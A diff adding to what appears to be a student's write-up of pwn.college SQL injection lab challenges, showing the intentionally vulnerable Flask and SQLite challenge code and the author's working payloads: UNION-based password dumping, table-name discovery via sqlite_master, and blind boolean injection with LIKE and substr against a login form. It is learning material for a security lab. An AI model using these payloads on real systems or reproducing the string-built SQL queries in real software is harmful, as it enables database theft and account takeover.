@@ -689,5 +689,140 @@ app.run("challenge.localhost", 80)
 ```
 query: 'SELECT username FROM users WHERE username LIKE "{query}"'
 
+payload: " UNION SELECT password FROM users-- 
+
+Executed: SELECT username FROM users WHERE username LIKE "" UNION SELECT password FROM users-- "
+
+This printed out the password for all users. It works since we closed the "" and had another union statement which matched the shape of the first select statement. 
+
+Tried to make it work by ending the command with ";", but this did not work.
+```
+
+**SQLi 4:**
+```python
+@app.route("/", methods=["GET"])
+def challenge():
+    query = flask.request.args.get("query", "%")
+
+    try:
+        # https://www.sqlite.org/schematab.html
+        # https://www.sqlite.org/lang_select.html
+        sql = f'SELECT username FROM {random_user_table} WHERE username LIKE "{query}"'
+        print(f"DEBUG: {query=}")
+        results = "\n".join(user["username"] for user in db.execute(sql).fetchall())
+    except sqlite3.Error as e:
+        results = f"SQL error: {e}"
+
+    return f"""
+        <html><body>Welcome to the user query service!
+        <form>Query:<input type=text name=query value='{query}'><input type=submit value=Submit></form>
+        <hr>
+        <b>Query:</b> <pre>{ sql.replace(random_user_table, "REDACTED") }</pre><br>
+        <b>Results:</b><pre>{results}</pre>
+        </body></html>
+        """
+
+
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = f"challenge.localhost:80"
+app.run("challenge.localhost", 80)
 
 ```
+
+```
+Query: 'SELECT username FROM {random_user_table} WHERE username LIKE "{query}"'
+
+Goal: We want to know the name of the table, then we can do the same as the last challenge. 
+
+Note that from the source code we can verify that this is a sqllite3 database. Doing some research on how to query database names in sqllite3:
+
+payload: " UNION SELECT name FROM sqlite_master WHERE type = 'table'--
+
+Executed: SELECT username FROM REDACTED WHERE username LIKE "" UNION SELECT name  FROM sqlite_master  WHERE type = 'table' --"
+
+tablename: users_8556433654
+
+So now we can send the payload: " UNION SELECT password FROM users_8556433654--
+
+Which gets us the flag.
+```
+
+**SQLi 5:**
+```python
+@app.route("/", methods=["POST"])
+def challenge_post():
+    username = flask.request.form.get("username")
+    password = flask.request.form.get("password")
+    if not username:
+        flask.abort(400, "Missing `username` form parameter")
+    if not password:
+        flask.abort(400, "Missing `password` form parameter")
+
+    try:
+        # https://www.sqlite.org/lang_select.html
+        query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND password = '{ password }'"
+        print(f"DEBUG: {query=}")
+        user = db.execute(query).fetchone()
+    except sqlite3.Error as e:
+        flask.abort(500, f"Query: {query}\nError: {e}")
+
+    if not user:
+        flask.abort(403, "Invalid username or password")
+
+    flask.session["user"] = username
+    return flask.redirect(flask.request.path)
+
+
+@app.route("/", methods=["GET"])
+def challenge_get():
+    if not (username := flask.session.get("user", None)):
+        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
+    else:
+        page = f"<html><body>Hello, {username}!"
+
+    return (
+        page
+        + """
+        <hr>
+        <form method=post>
+        User:<input type=text name=username>Password:<input type=text name=password><input type=submit value=Submit>
+        </form>
+        </body></html>
+    """
+    )
+
+
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = f"challenge.localhost:80"
+app.run("challenge.localhost", 80)
+```
+
+```
+"SELECT rowid, * FROM users WHERE username = '{username}' AND password = '{ password }'"
+
+payload: 
+' OR password like 'p%'-- => gives okey reponse 
+' OR password like 'a%'-- => gives error response 
+
+' OR password like 'pwn.college{gfbii%}%'--
+
+substr(string, start, length)
+' OR substr(password, 1,1) > 'r'--
+
+Executed: "(SELECT rowid, * FROM users WHERE username = '{username}' AND password = '') OR username = 'admin' AND substr(password,1,1) > 'r' --'"
+
+Gives false positives corresponding to the guest password. 
+
+NOTE:
+All pwncollege flags is ~57 characters 
+LIKE is case sensitive 
+Set of possible characters: upper, lower, numbers, ._-
+Consider using glob or substring insted of like
+
+Can do trial and error, or make a binary search script. Consider doing this problem later. 
+
+
+{gFbIiUfK9eKe9pHmMmftE7b20SP.dNTOzMDL3QDMyQzW}
+
+```
+
